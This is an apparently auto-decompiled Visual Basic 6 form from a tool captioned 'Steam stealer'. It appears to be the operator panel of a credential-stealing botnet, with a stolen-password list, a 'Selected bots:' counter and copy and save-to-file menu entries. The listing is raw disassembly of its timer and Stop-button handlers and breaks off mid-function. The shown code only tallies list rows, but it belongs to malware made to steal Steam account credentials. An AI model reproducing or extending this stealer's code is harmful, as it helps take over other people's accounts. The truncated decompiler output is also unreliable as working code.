VERSION 5.00
Begin VB.Form frmSteam
  Caption = "Steam stealer"
  ScaleMode = 1
  AutoRedraw = False
  FontTransparent = True
  Icon = "frmSteam.frx":0
  LinkTopic = "Form1"
  ClientLeft = 120
  ClientTop = 450
  ClientWidth = 11310
  ClientHeight = 6855
  StartUpPosition = 3 'Windows Default
  Begin XtremeSuiteControls.ListView lstReport
    Left = 0
    Top = 0
    Width = 11295
    Height = 5775
    TabIndex = 0
  End
  Begin XtremeSuiteControls.GroupBox gbCommands
    Left = 0
    Top = 5760
    Width = 11295
    Height = 735
    TabIndex = 1
    Begin VB.Timer tmrInfo
      Interval = 100
      Left = 1200
      Top = 0
    End
    Begin XtremeSuiteControls.PushButton cmdStart
      Left = 10200
      Top = 240
      Width = 975
      Height = 375
      TabIndex = 2
    End
    Begin XtremeSuiteControls.PushButton cmdStop
      Left = 120
      Top = 240
      Width = 975
      Height = 375
      TabIndex = 3
    End
  End
  Begin MSComctlLib.StatusBar sbStatus
    Left = 0
    Top = 6540
    Width = 11310
    Height = 315
    TabIndex = 4
  End
  Begin VB.Menu mnuMenuPws
    Visible = 0   'False
    Caption = "Menu"
    Begin VB.Menu mnuListPasswords
      Index = 0
      Caption = "Copy"
    End
    Begin VB.Menu mnuListPasswords
      Index = 1
      Caption = "-"
    End
    Begin VB.Menu mnuListPasswords
      Index = 2
      Caption = "Save to file"
    End
  End
End

Attribute VB_Name = "frmSteam"


Private sub tmrInfo__8D6F28
008D6F28: push ebp
008D6F29: mov ebp, esp
008D6F2B: sub esp, 0000000Ch
008D6F2E: push 004106A6h ; msvbvm60.dll.__vbaExceptHandler
008D6F33: mov eax, fs:[00h]
008D6F39: push eax
008D6F3A: mov fs:[00000000h], esp
008D6F41: mov eax, 000000D4h
008D6F46: call 004106A0h ; msvbvm60.dll.__vbaChkstk
008D6F4B: push ebx
008D6F4C: push esi
008D6F4D: push edi
008D6F4E: mov var_0C, esp
008D6F51: mov var_08, 0040FD50h
008D6F58: mov eax, [ebp+08h]
008D6F5B: and eax, 00000001h
008D6F5E: mov var_04, eax
008D6F61: mov eax, [ebp+08h]
008D6F64: and al, FEh
008D6F66: mov [ebp+08h], eax
008D6F69: mov eax, [ebp+08h]
008D6F6C: mov eax, [eax]
008D6F6E: push [ebp+08h]
008D6F71: call [eax+04h]
008D6F74: movsx eax, word ptr [8F2430h]
008D6F7B: test eax, eax
008D6F7D: jnz 008D727Bh
008D6F83: cmp [008F2010h], 00000000h
008D6F8A: jnz 8D6FA7h
008D6F8C: push 008F2010h
008D6F91: push 00433984h
008D6F96: call 00410A4Eh ; msvbvm60.dll.__vbaNew2
008D6F9B: mov var_000000C4, 008F2010h
008D6FA5: jmp 8D6FB1h
008D6FA7: mov var_000000C4, 008F2010h
008D6FB1: push 00000000h
008D6FB3: push 00000001h
008D6FB5: push 00440E48h
008D6FBA: push 00000000h
008D6FBC: push 00000018h
008D6FBE: mov eax, var_000000C4
008D6FC4: mov eax, [eax]
008D6FC6: mov ecx, var_000000C4
008D6FCC: mov ecx, [ecx]
008D6FCE: mov ecx, [ecx]
008D6FD0: push eax
008D6FD1: call [ecx+00000550h]
008D6FD7: push eax
008D6FD8: lea eax, var_28
008D6FDB: push eax
008D6FDC: call 00410A84h ; Set (object)
008D6FE1: push eax
008D6FE2: lea eax, var_48
008D6FE5: push eax
008D6FE6: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
008D6FEB: add esp, 00000010h
008D6FEE: push eax
008D6FEF: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
008D6FF4: push eax
008D6FF5: lea eax, var_2C
008D6FF8: push eax
008D6FF9: call 00410A84h ; Set (object)
008D6FFE: push eax
008D6FFF: lea eax, var_58
008D7002: push eax
008D7003: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
008D7008: add esp, 00000010h
008D700B: push eax
008D700C: call 00410A90h ; msvbvm60.dll.__vbaI4Var
008D7011: xor ecx, ecx
008D7013: test eax, eax
008D7015: setnle cl
008D7018: neg ecx
008D701A: mov var_0000009C, cx
008D7021: lea eax, var_2C
008D7024: push eax
008D7025: lea eax, var_28
008D7028: push eax
008D7029: push 00000002h
008D702B: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
008D7030: add esp, 0000000Ch
008D7033: lea eax, var_58
008D7036: push eax
008D7037: lea eax, var_48
008D703A: push eax
008D703B: push 00000002h
008D703D: call 00410A42h ; msvbvm60.dll.__vbaFreeVarList
008D7042: add esp, 0000000Ch
008D7045: movsx eax, word ptr var_0000009C
008D704C: test eax, eax
008D704E: jz 008D7276h
008D7054: cmp [008F2010h], 00000000h
008D705B: jnz 8D7078h
008D705D: push 008F2010h
008D7062: push 00433984h
008D7067: call 00410A4Eh ; msvbvm60.dll.__vbaNew2
008D706C: mov var_000000C8, 008F2010h
008D7076: jmp 8D7082h
008D7078: mov var_000000C8, 008F2010h
008D7082: push 00000000h
008D7084: push 00000001h
008D7086: push 00440E48h
008D708B: push 00000000h
008D708D: push 00000018h
008D708F: mov eax, var_000000C8
008D7095: mov eax, [eax]
008D7097: mov ecx, var_000000C8
008D709D: mov ecx, [ecx]
008D709F: mov ecx, [ecx]
008D70A1: push eax
008D70A2: call [ecx+00000550h]
008D70A8: push eax
008D70A9: lea eax, var_28
008D70AC: push eax
008D70AD: call 00410A84h ; Set (object)
008D70B2: push eax
008D70B3: lea eax, var_48
008D70B6: push eax
008D70B7: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
008D70BC: add esp, 00000010h
008D70BF: push eax
008D70C0: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
008D70C5: push eax
008D70C6: lea eax, var_2C
008D70C9: push eax
008D70CA: call 00410A84h ; Set (object)
008D70CF: push eax
008D70D0: lea eax, var_58
008D70D3: push eax
008D70D4: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
008D70D9: add esp, 00000010h
008D70DC: push eax
008D70DD: call 00410A90h ; msvbvm60.dll.__vbaI4Var
008D70E2: mov var_000000B0, eax
008D70E8: mov var_000000AC, 00000001h
008D70F2: mov var_18, 00000001h
008D70F9: lea eax, var_2C
008D70FC: push eax
008D70FD: lea eax, var_28
008D7100: push eax
008D7101: push 00000002h
008D7103: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
008D7108: add esp, 0000000Ch
008D710B: lea eax, var_58
008D710E: push eax
008D710F: lea eax, var_48
008D7112: push eax
008D7113: push 00000002h
008D7115: call 00410A42h ; msvbvm60.dll.__vbaFreeVarList
008D711A: add esp, 0000000Ch
008D711D: jmp 8D7131h
008D711F: mov eax, var_18
008D7122: add eax, var_000000AC
008D7128: jo 008D78F7h
008D712E: mov var_18, eax
008D7131: mov eax, var_18
008D7134: cmp eax, var_000000B0
008D713A: jnle 008D7276h
008D7140: mov eax, var_18
008D7143: mov var_80, eax
008D7146: mov var_00000088, 00000003h
008D7150: cmp [008F2010h], 00000000h
008D7157: jnz 8D7174h
008D7159: push 008F2010h
008D715E: push 00433984h
008D7163: call 00410A4Eh ; msvbvm60.dll.__vbaNew2
008D7168: mov var_000000CC, 008F2010h
008D7172: jmp 8D717Eh
008D7174: mov var_000000CC, 008F2010h
008D717E: push 00000000h
008D7180: push 00000004h
008D7182: push 00440E58h
008D7187: push 00000010h
008D7189: pop eax
008D718A: call 004106A0h ; msvbvm60.dll.__vbaChkstk
008D718F: lea esi, var_00000088
008D7195: mov edi, esp
008D7197: movsd 
008D7198: movsd 
008D7199: movsd 
008D719A: movsd 
008D719B: push 00000001h
008D719D: push 00000000h
008D719F: push 00440E48h
008D71A4: push 00000000h
008D71A6: push 00000018h
008D71A8: mov eax, var_000000CC
008D71AE: mov eax, [eax]
008D71B0: mov ecx, var_000000CC
008D71B6: mov ecx, [ecx]
008D71B8: mov ecx, [ecx]
008D71BA: push eax
008D71BB: call [ecx+00000550h]
008D71C1: push eax
008D71C2: lea eax, var_28
008D71C5: push eax
008D71C6: call 00410A84h ; Set (object)
008D71CB: push eax
008D71CC: lea eax, var_48
008D71CF: push eax
008D71D0: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
008D71D5: add esp, 00000010h
008D71D8: push eax
008D71D9: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
008D71DE: push eax
008D71DF: lea eax, var_2C
008D71E2: push eax
008D71E3: call 00410A84h ; Set (object)
008D71E8: push eax
008D71E9: lea eax, var_58
008D71EC: push eax
008D71ED: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
008D71F2: add esp, 00000020h
008D71F5: push eax
008D71F6: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
008D71FB: push eax
008D71FC: lea eax, var_30
008D71FF: push eax
008D7200: call 00410A84h ; Set (object)
008D7205: push eax
008D7206: lea eax, var_68
008D7209: push eax
008D720A: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
008D720F: add esp, 00000010h
008D7212: push eax
008D7213: call 004108C8h ; msvbvm60.dll.__vbaBoolVar
008D7218: sub ax, FFFFh
008D721C: neg ax
008D721F: sbb eax, eax
008D7221: inc eax
008D7222: neg eax
008D7224: mov var_0000009C, ax
008D722B: lea eax, var_30
008D722E: push eax
008D722F: lea eax, var_2C
008D7232: push eax
008D7233: lea eax, var_28
008D7236: push eax
008D7237: push 00000003h
008D7239: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
008D723E: add esp, 00000010h
008D7241: lea eax, var_68
008D7244: push eax
008D7245: lea eax, var_58
008D7248: push eax
008D7249: lea eax, var_48
008D724C: push eax
008D724D: push 00000003h
008D724F: call 00410A42h ; msvbvm60.dll.__vbaFreeVarList
008D7254: add esp, 00000010h
008D7257: movsx eax, word ptr var_0000009C
008D725E: test eax, eax
008D7260: jz 8D7271h
008D7262: mov eax, var_1C
008D7265: add eax, 00000001h
008D7268: jo 008D78F7h
008D726E: mov var_1C, eax
008D7271: jmp 008D711Fh
008D7276: jmp 008D7561h
008D727B: cmp [008F2010h], 00000000h
008D7282: jnz 8D729Fh
008D7284: push 008F2010h
008D7289: push 00433984h
008D728E: call 00410A4Eh ; msvbvm60.dll.__vbaNew2
008D7293: mov var_000000D0, 008F2010h
008D729D: jmp 8D72A9h
008D729F: mov var_000000D0, 008F2010h
008D72A9: and var_80, 00000000h
008D72AD: mov var_00000088, 00008002h
008D72B7: push 00000000h
008D72B9: push 0044A9C8h ; COUNT
008D72BE: push 00000000h
008D72C0: push 0044A9B0h ; lstFiltered
008D72C5: mov eax, var_000000D0
008D72CB: mov eax, [eax]
008D72CD: mov ecx, var_000000D0
008D72D3: mov ecx, [ecx]
008D72D5: mov ecx, [ecx]
008D72D7: push eax
008D72D8: call [ecx+00000550h]
008D72DE: push eax
008D72DF: lea eax, var_28
008D72E2: push eax
008D72E3: call 00410A84h ; Set (object)
008D72E8: push eax
008D72E9: lea eax, var_48
008D72EC: push eax
008D72ED: call 00410742h ; msvbvm60.dll.__vbaLateMemCallLd
008D72F2: add esp, 00000010h
008D72F5: push eax
008D72F6: lea eax, var_58
008D72F9: push eax
008D72FA: call 004107D8h ; msvbvm60.dll.__vbaVarLateMemCallLd
008D72FF: add esp, 00000010h
008D7302: push eax
008D7303: lea eax, var_00000088
008D7309: push eax
008D730A: call 0041091Ch ; msvbvm60.dll.__vbaVarTstGt
008D730F: mov var_0000009C, ax
008D7316: lea ecx, var_28
008D7319: call 00410A7Eh ; msvbvm60.dll.__vbaFreeObj
008D731E: lea eax, var_58
008D7321: push eax
008D7322: lea eax, var_48
008D7325: push eax
008D7326: push 00000002h
008D7328: call 00410A42h ; msvbvm60.dll.__vbaFreeVarList
008D732D: add esp, 0000000Ch
008D7330: movsx eax, word ptr var_0000009C
008D7337: test eax, eax
008D7339: jz 008D7561h
008D733F: cmp [008F2010h], 00000000h
008D7346: jnz 8D7363h
008D7348: push 008F2010h
008D734D: push 00433984h
008D7352: call 00410A4Eh ; msvbvm60.dll.__vbaNew2
008D7357: mov var_000000D4, 008F2010h
008D7361: jmp 8D736Dh
008D7363: mov var_000000D4, 008F2010h
008D736D: push 00000000h
008D736F: push 00000001h
008D7371: push 00440E48h
008D7376: push 00000000h
008D7378: push 00000018h
008D737A: mov eax, var_000000D4
008D7380: mov eax, [eax]
008D7382: mov ecx, var_000000D4
008D7388: mov ecx, [ecx]
008D738A: mov ecx, [ecx]
008D738C: push eax
008D738D: call [ecx+0000054Ch]
008D7393: push eax
008D7394: lea eax, var_28
008D7397: push eax
008D7398: call 00410A84h ; Set (object)
008D739D: push eax
008D739E: lea eax, var_48
008D73A1: push eax
008D73A2: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
008D73A7: add esp, 00000010h
008D73AA: push eax
008D73AB: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
008D73B0: push eax
008D73B1: lea eax, var_2C
008D73B4: push eax
008D73B5: call 00410A84h ; Set (object)
008D73BA: push eax
008D73BB: lea eax, var_58
008D73BE: push eax
008D73BF: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
008D73C4: add esp, 00000010h
008D73C7: push eax
008D73C8: call 00410A90h ; msvbvm60.dll.__vbaI4Var
008D73CD: mov var_000000B8, eax
008D73D3: mov var_000000B4, 00000001h
008D73DD: mov var_18, 00000001h
008D73E4: lea eax, var_2C
008D73E7: push eax
008D73E8: lea eax, var_28
008D73EB: push eax
008D73EC: push 00000002h
008D73EE: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
008D73F3: add esp, 0000000Ch
008D73F6: lea eax, var_58
008D73F9: push eax
008D73FA: lea eax, var_48
008D73FD: push eax
008D73FE: push 00000002h
008D7400: call 00410A42h ; msvbvm60.dll.__vbaFreeVarList
008D7405: add esp, 0000000Ch
008D7408: jmp 8D741Ch
008D740A: mov eax, var_18
008D740D: add eax, var_000000B4
008D7413: jo 008D78F7h
008D7419: mov var_18, eax
008D741C: mov eax, var_18
008D741F: cmp eax, var_000000B8
008D7425: jnle 008D7561h
008D742B: mov eax, var_18
008D742E: mov var_80, eax
008D7431: mov var_00000088, 00000003h
008D743B: cmp [008F2010h], 00000000h
008D7442: jnz 8D745Fh
008D7444: push 008F2010h
008D7449: push 00433984h
008D744E: call 00410A4Eh ; msvbvm60.dll.__vbaNew2
008D7453: mov var_000000D8, 008F2010h
008D745D: jmp 8D7469h
008D745F: mov var_000000D8, 008F2010h
008D7469: push 00000000h
008D746B: push 00000004h
008D746D: push 00440E58h
008D7472: push 00000010h
008D7474: pop eax
008D7475: call 004106A0h ; msvbvm60.dll.__vbaChkstk
008D747A: lea esi, var_00000088
008D7480: mov edi, esp
008D7482: movsd 
008D7483: movsd 
008D7484: movsd 
008D7485: movsd 
008D7486: push 00000001h
008D7488: push 00000000h
008D748A: push 00440E48h
008D748F: push 00000000h
008D7491: push 00000018h
008D7493: mov eax, var_000000D8
008D7499: mov eax, [eax]
008D749B: mov ecx, var_000000D8
008D74A1: mov ecx, [ecx]
008D74A3: mov ecx, [ecx]
008D74A5: push eax
008D74A6: call [ecx+0000054Ch]
008D74AC: push eax
008D74AD: lea eax, var_28
008D74B0: push eax
008D74B1: call 00410A84h ; Set (object)
008D74B6: push eax
008D74B7: lea eax, var_48
008D74BA: push eax
008D74BB: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
008D74C0: add esp, 00000010h
008D74C3: push eax
008D74C4: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
008D74C9: push eax
008D74CA: lea eax, var_2C
008D74CD: push eax
008D74CE: call 00410A84h ; Set (object)
008D74D3: push eax
008D74D4: lea eax, var_58
008D74D7: push eax
008D74D8: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
008D74DD: add esp, 00000020h
008D74E0: push eax
008D74E1: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
008D74E6: push eax
008D74E7: lea eax, var_30
008D74EA: push eax
008D74EB: call 00410A84h ; Set (object)
008D74F0: push eax
008D74F1: lea eax, var_68
008D74F4: push eax
008D74F5: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
008D74FA: add esp, 00000010h
008D74FD: push eax
008D74FE: call 004108C8h ; msvbvm60.dll.__vbaBoolVar
008D7503: sub ax, FFFFh
008D7507: neg ax
008D750A: sbb eax, eax
008D750C: inc eax
008D750D: neg eax
008D750F: mov var_0000009C, ax
008D7516: lea eax, var_30
008D7519: push eax
008D751A: lea eax, var_2C
008D751D: push eax
008D751E: lea eax, var_28
008D7521: push eax
008D7522: push 00000003h
008D7524: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
008D7529: add esp, 00000010h
008D752C: lea eax, var_68
008D752F: push eax
008D7530: lea eax, var_58
008D7533: push eax
008D7534: lea eax, var_48
008D7537: push eax
008D7538: push 00000003h
008D753A: call 00410A42h ; msvbvm60.dll.__vbaFreeVarList
008D753F: add esp, 00000010h
008D7542: movsx eax, word ptr var_0000009C
008D7549: test eax, eax
008D754B: jz 8D755Ch
008D754D: mov eax, var_1C
008D7550: add eax, 00000001h
008D7553: jo 008D78F7h
008D7559: mov var_1C, eax
008D755C: jmp 008D740Ah
008D7561: push 0044A87Ch
008D7566: push 00000000h
008D7568: push 00000003h
008D756A: mov eax, [ebp+08h]
008D756D: mov eax, [eax]
008D756F: push [ebp+08h]
008D7572: call [eax+00000318h]
008D7578: push eax
008D7579: lea eax, var_30
008D757C: push eax
008D757D: call 00410A84h ; Set (object)
008D7582: push eax
008D7583: lea eax, var_68
008D7586: push eax
008D7587: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
008D758C: add esp, 00000010h
008D758F: push eax
008D7590: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
008D7595: push eax
008D7596: lea eax, var_34
008D7599: push eax
008D759A: call 00410A84h ; Set (object)
008D759F: mov var_0000009C, eax
008D75A5: mov var_70, 00000001h
008D75AC: mov var_78, 00000002h
008D75B3: lea eax, var_38
008D75B6: push eax
008D75B7: lea eax, var_78
008D75BA: push eax
008D75BB: mov eax, var_0000009C
008D75C1: mov eax, [eax]
008D75C3: push var_0000009C
008D75C9: call [eax+24h]
008D75CC: fclex 
008D75CE: mov var_000000A0, eax
008D75D4: cmp var_000000A0, 00000000h
008D75DB: jnl 8D75FDh
008D75DD: push 00000024h
008D75DF: push 0044A87Ch
008D75E4: push var_0000009C
008D75EA: push var_000000A0
008D75F0: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
008D75F5: mov var_000000DC, eax
008D75FB: jmp 8D7604h
008D75FD: and var_000000DC, 00000000h
008D7604: mov eax, var_38
008D7607: mov var_000000A4, eax
008D760D: push 004599C0h ; Total:
008D7612: push 00000000h
008D7614: push 00000001h
008D7616: push 00440E48h
008D761B: push 00000000h
008D761D: push 00000018h
008D761F: mov eax, [ebp+08h]
008D7622: mov eax, [eax]
008D7624: push [ebp+08h]
008D7627: call [eax+00000308h]
008D762D: push eax
008D762E: lea eax, var_28
008D7631: push eax
008D7632: call 00410A84h ; Set (object)
008D7637: push eax
008D7638: lea eax, var_48
008D763B: push eax
008D763C: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
008D7641: add esp, 00000010h
008D7644: push eax
008D7645: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
008D764A: push eax
008D764B: lea eax, var_2C
008D764E: push eax
008D764F: call 00410A84h ; Set (object)
008D7654: push eax
008D7655: lea eax, var_58
008D7658: push eax
008D7659: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
008D765E: add esp, 00000010h
008D7661: push eax
008D7662: call 00410A90h ; msvbvm60.dll.__vbaI4Var
008D7667: push eax
008D7668: call 00410A1Eh ; msvbvm60.dll.__vbaStrI4
008D766D: mov edx, eax
008D766F: lea ecx, var_20
008D7672: call 00410A24h ; msvbvm60.dll.__vbaStrMove
008D7677: push eax
008D7678: call 00410A18h ; &
008D767D: mov edx, eax
008D767F: lea ecx, var_24
008D7682: call 00410A24h ; msvbvm60.dll.__vbaStrMove
008D7687: push eax
008D7688: mov eax, var_000000A4
008D768E: mov eax, [eax]
008D7690: push var_000000A4
008D7696: call [eax+00000080h]
008D769C: fclex 
008D769E: mov var_000000A8, eax
008D76A4: cmp var_000000A8, 00000000h
008D76AB: jnl 8D76D0h
008D76AD: push 00000080h
008D76B2: push 0044A88Ch
008D76B7: push var_000000A4
008D76BD: push var_000000A8
008D76C3: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
008D76C8: mov var_000000E0, eax
008D76CE: jmp 8D76D7h
008D76D0: and var_000000E0, 00000000h
008D76D7: lea eax, var_24
008D76DA: push eax
008D76DB: lea eax, var_20
008D76DE: push eax
008D76DF: push 00000002h
008D76E1: call 00410A12h ; msvbvm60.dll.__vbaFreeStrList
008D76E6: add esp, 0000000Ch
008D76E9: lea eax, var_38
008D76EC: push eax
008D76ED: lea eax, var_34
008D76F0: push eax
008D76F1: lea eax, var_30
008D76F4: push eax
008D76F5: lea eax, var_2C
008D76F8: push eax
008D76F9: lea eax, var_28
008D76FC: push eax
008D76FD: push 00000005h
008D76FF: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
008D7704: add esp, 00000018h
008D7707: lea eax, var_78
008D770A: push eax
008D770B: lea eax, var_68
008D770E: push eax
008D770F: lea eax, var_58
008D7712: push eax
008D7713: lea eax, var_48
008D7716: push eax
008D7717: push 00000004h
008D7719: call 00410A42h ; msvbvm60.dll.__vbaFreeVarList
008D771E: add esp, 00000014h
008D7721: push 0044A87Ch
008D7726: push 00000000h
008D7728: push 00000003h
008D772A: mov eax, [ebp+08h]
008D772D: mov eax, [eax]
008D772F: push [ebp+08h]
008D7732: call [eax+00000318h]
008D7738: push eax
008D7739: lea eax, var_28
008D773C: push eax
008D773D: call 00410A84h ; Set (object)
008D7742: push eax
008D7743: lea eax, var_48
008D7746: push eax
008D7747: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
008D774C: add esp, 00000010h
008D774F: push eax
008D7750: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
008D7755: push eax
008D7756: lea eax, var_2C
008D7759: push eax
008D775A: call 00410A84h ; Set (object)
008D775F: mov var_0000009C, eax
008D7765: mov var_50, 00000002h
008D776C: mov var_58, 00000002h
008D7773: lea eax, var_30
008D7776: push eax
008D7777: lea eax, var_58
008D777A: push eax
008D777B: mov eax, var_0000009C
008D7781: mov eax, [eax]
008D7783: push var_0000009C
008D7789: call [eax+24h]
008D778C: fclex 
008D778E: mov var_000000A0, eax
008D7794: cmp var_000000A0, 00000000h
008D779B: jnl 8D77BDh
008D779D: push 00000024h
008D779F: push 0044A87Ch
008D77A4: push var_0000009C
008D77AA: push var_000000A0
008D77B0: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
008D77B5: mov var_000000E4, eax
008D77BB: jmp 8D77C4h
008D77BD: and var_000000E4, 00000000h
008D77C4: mov eax, var_30
008D77C7: mov var_000000A4, eax
008D77CD: push 00457C58h ; Selected bots:
008D77D2: push var_1C
008D77D5: call 00410A1Eh ; msvbvm60.dll.__vbaStrI4
008D77DA: mov edx, eax
008D77DC: lea ecx, var_20
008D77DF: call 00410A24h ; msvbvm60.dll.__vbaStrMove
008D77E4: push eax
008D77E5: call 00410A18h ; &
008D77EA: mov edx, eax
008D77EC: lea ecx, var_24
008D77EF: call 00410A24h ; msvbvm60.dll.__vbaStrMove
008D77F4: push eax
008D77F5: mov eax, var_000000A4
008D77FB: mov eax, [eax]
008D77FD: push var_000000A4
008D7803: call [eax+00000080h]
008D7809: fclex 
008D780B: mov var_000000A8, eax
008D7811: cmp var_000000A8, 00000000h
008D7818: jnl 8D783Dh
008D781A: push 00000080h
008D781F: push 0044A88Ch
008D7824: push var_000000A4
008D782A: push var_000000A8
008D7830: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
008D7835: mov var_000000E8, eax
008D783B: jmp 8D7844h
008D783D: and var_000000E8, 00000000h
008D7844: lea eax, var_24
008D7847: push eax
008D7848: lea eax, var_20
008D784B: push eax
008D784C: push 00000002h
008D784E: call 00410A12h ; msvbvm60.dll.__vbaFreeStrList
008D7853: add esp, 0000000Ch
008D7856: lea eax, var_30
008D7859: push eax
008D785A: lea eax, var_2C
008D785D: push eax
008D785E: lea eax, var_28
008D7861: push eax
008D7862: push 00000003h
008D7864: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
008D7869: add esp, 00000010h
008D786C: lea eax, var_58
008D786F: push eax
008D7870: lea eax, var_48
008D7873: push eax
008D7874: push 00000002h
008D7876: call 00410A42h ; msvbvm60.dll.__vbaFreeVarList
008D787B: add esp, 0000000Ch
008D787E: mov var_04, 00000000h
008D7885: push 008D78D8h
008D788A: jmp 8D78D7h
008D788C: lea eax, var_24
008D788F: push eax
008D7890: lea eax, var_20
008D7893: push eax
008D7894: push 00000002h
008D7896: call 00410A12h ; msvbvm60.dll.__vbaFreeStrList
008D789B: add esp, 0000000Ch
008D789E: lea eax, var_38
008D78A1: push eax
008D78A2: lea eax, var_34
008D78A5: push eax
008D78A6: lea eax, var_30
008D78A9: push eax
008D78AA: lea eax, var_2C
008D78AD: push eax
008D78AE: lea eax, var_28
008D78B1: push eax
008D78B2: push 00000005h
008D78B4: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
008D78B9: add esp, 00000018h
008D78BC: lea eax, var_78
008D78BF: push eax
008D78C0: lea eax, var_68
008D78C3: push eax
008D78C4: lea eax, var_58
008D78C7: push eax
008D78C8: lea eax, var_48
008D78CB: push eax
008D78CC: push 00000004h
008D78CE: call 00410A42h ; msvbvm60.dll.__vbaFreeVarList
008D78D3: add esp, 00000014h
008D78D6: ret 
End Sub

Private sub cmdStop__8D5D18
008D5D18: push ebp
008D5D19: mov ebp, esp
008D5D1B: sub esp, 00000018h
008D5D1E: push 004106A6h ; msvbvm60.dll.__vbaExceptHandler
008D5D23: mov eax, fs:[00h]
008D5D29: push eax
008D5D2A: mov fs:[00000000h], esp
008D5D31: mov eax, 000000C4h
008D5D36: call 004106A0h ; msvbvm60.dll.__vbaChkstk
008D5D3B: push ebx
008D5D3C: push esi
008D5D3D: push edi
008D5D3E: mov var_18, esp
008D5D41: mov var_14, 0040FC90h
008D5D48: mov eax, [ebp+08h]
008D5D4B: and eax, 00000001h
008D5D4E: mov var_10, eax
008D5D51: mov eax, [ebp+08h]
008D5D54: and al, FEh
008D5D56: mov [ebp+08h], eax
008D5D59: mov var_0C, 00000000h
008D5D60: mov eax, [ebp+08h]
008D5D63: mov eax, [eax]
008D5D65: push [ebp+08h]
008D5D68: call [eax+04h]
008D5D6B: mov var_04, 00000001h
008D5D72: mov var_04, 00000002h
008D5D79: push FFFFFFFFh
008D5D7B: call 00410A60h ; On Error ...
008D5D80: mov var_04, 00000003h
008D5D87: cmp word ptr [008F2430h], FFFFh
008D5D8F: jnz 008D6166h
008D5D95: mov var_04, 00000004h
008D5D9C: cmp [008F2010h], 00000000h
008D5DA3: jnz 8D5DC0h
008D5DA5: push 008F2010h
008D5DAA: push 00433984h
008D5DAF: call 00410A4Eh ; msvbvm60.dll.__vbaNew2
008D5DB4: mov var_000000D0, 008F2010h
008D5DBE: jmp 8D5DCAh
008D5DC0: mov var_000000D0, 008F2010h
008D5DCA: push 00000000h
008D5DCC: push 00000001h
008D5DCE: push 00440E48h
008D5DD3: push 00000000h
008D5DD5: push 00000018h
008D5DD7: mov eax, var_000000D0
008D5DDD: mov eax, [eax]
008D5DDF: mov ecx, var_000000D0
008D5DE5: mov ecx, [ecx]
008D5DE7: mov ecx, [ecx]
008D5DE9: push eax
008D5DEA: call [ecx+0000054Ch]
008D5DF0: push eax
008D5DF1: lea eax, var_30
008D5DF4: push eax
008D5DF5: call 00410A84h ; Set (object)
008D5DFA: push eax
008D5DFB: lea eax, var_48
008D5DFE: push eax
008D5DFF: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
008D5E04: add esp, 00000010h
008D5E07: push eax
008D5E08: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
008D5E0D: push eax
008D5E0E: lea eax, var_34
008D5E11: push eax
008D5E12: call 00410A84h ; Set (object)
008D5E17: push eax
008D5E18: lea eax, var_58
008D5E1B: push eax
008D5E1C: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
008D5E21: add esp, 00000010h
008D5E24: push eax
008D5E25: call 00410A90h ; msvbvm60.dll.__vbaI4Var
008D5E2A: mov var_000000B0, eax
008D5E30: mov var_000000AC, 00000001h
008D5E3A: mov var_24, 00000001h
008D5E41: lea eax, var_34
008D5E44: push eax
008D5E45: lea eax, var_30
008D5E48: push eax
008D5E49: push 00000002h
008D5E4B: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
008D5E50: add esp, 0000000Ch
008D5E53: lea eax, var_58
008D5E56: push eax
008D5E57: lea eax, var_48
008D5E5A: push eax
008D5E5B: push 00000002h
008D5E5D: call 00410A42h ; msvbvm60.dll.__vbaFreeVarList
008D5E62: add esp, 0000000Ch
008D5E65: jmp 8D5E79h
008D5E67: mov eax, var_24
008D5E6A: add eax, var_000000AC
008D5E70: jo 008D65ABh
008D5E76: mov var_24, eax
008D5E79: mov eax, var_24
008D5E7C: cmp eax, var_000000B0
008D5E82: jnle 008D6161h
008D5E88: mov var_04, 00000005h
008D5E8F: mov eax, var_24
008D5E92: mov var_74, eax
008D5E95: mov var_7C, 00000003h
008D5E9C: cmp [008F2010h], 00000000h
008D5EA3: jnz 8D5EC0h
008D5EA5: push 008F2010h
008D5EAA: push 00433984h
008D5EAF: call 00410A4Eh ; msvbvm60.dll.__vbaNew2
008D5EB4: mov var_000000D4, 008F2010h
008D5EBE: jmp 8D5ECAh
